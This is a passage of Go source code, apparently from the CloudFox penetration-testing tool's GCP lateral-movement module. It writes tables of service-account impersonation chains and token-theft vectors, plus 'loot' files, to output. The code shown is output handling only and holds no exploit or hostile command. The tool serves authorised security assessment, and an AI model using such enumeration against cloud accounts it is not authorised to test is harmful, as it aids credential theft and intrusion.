			Header: m.getVectorsHeader(),
			Body:   m.vectorsToTableBody(vectors),
		})
	}

	return tableFiles
}

func (m *LateralMovementModule) writeHierarchicalOutput(ctx context.Context, logger internal.Logger) {
	outputData := internal.HierarchicalOutputData{
		OrgLevelData:     make(map[string]internal.CloudfoxOutput),
		ProjectLevelData: make(map[string]internal.CloudfoxOutput),
	}

	// Collect all project IDs that have data
	projectIDs := make(map[string]bool)
	for projectID := range m.ProjectImpersonationChains {
		projectIDs[projectID] = true
	}
	for projectID := range m.ProjectTokenTheftVectors {
		projectIDs[projectID] = true
	}

	for projectID := range projectIDs {
		tableFiles := m.buildTablesForProject(projectID)

		var lootFiles []internal.LootFile
		if projectLoot, ok := m.LootMap[projectID]; ok {
			for _, loot := range projectLoot {
				if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
					lootFiles = append(lootFiles, *loot)
				}
			}
		}

		outputData.ProjectLevelData[projectID] = LateralMovementOutput{Table: tableFiles, Loot: lootFiles}
	}

	pathBuilder := m.BuildPathBuilder()

	err := internal.HandleHierarchicalOutputSmart("gcp", m.Format, m.Verbosity, m.WrapTable, pathBuilder, outputData)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing hierarchical output: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
	}
}

func (m *LateralMovementModule) writeFlatOutput(ctx context.Context, logger internal.Logger) {
	allChains := m.getAllImpersonationChains()
	allVectors := m.getAllTokenTheftVectors()

	tables := []internal.TableFile{}

	if len(allChains) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "lateral-impersonation-chains",
			Header: m.getChainsHeader(),
			Body:   m.chainsToTableBody(allChains),
		})
		logger.InfoM(fmt.Sprintf("[PENTEST] Found %d impersonation chain(s)", len(allChains)), GCP_LATERALMOVEMENT_MODULE_NAME)
	}

	if len(allVectors) > 0 {
		tables = append(tables, internal.TableFile{
			Name:   "lateral-token-theft",
			Header: m.getVectorsHeader(),
			Body:   m.vectorsToTableBody(allVectors),
		})
	}

	// Collect loot files
	var lootFiles []internal.LootFile
	for _, projectLoot := range m.LootMap {
		for _, loot := range projectLoot {
			if loot != nil && loot.Contents != "" && !strings.HasSuffix(loot.Contents, "# Generated by CloudFox\n\n") {
				lootFiles = append(lootFiles, *loot)
			}
		}
	}

	output := LateralMovementOutput{
		Table: tables,
		Loot:  lootFiles,
	}

	scopeNames := make([]string, len(m.ProjectIDs))
	for i, projectID := range m.ProjectIDs {
		scopeNames[i] = m.GetProjectName(projectID)
	}

	err := internal.HandleOutputSmart(
		"gcp",
		m.Format,
		m.OutputDirectory,
		m.Verbosity,
		m.WrapTable,
		"project",
		m.ProjectIDs,
		scopeNames,
		m.Account,
		output,
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error writing output: %v", err), GCP_LATERALMOVEMENT_MODULE_NAME)
		m.CommandCounter.Error++
	}
}
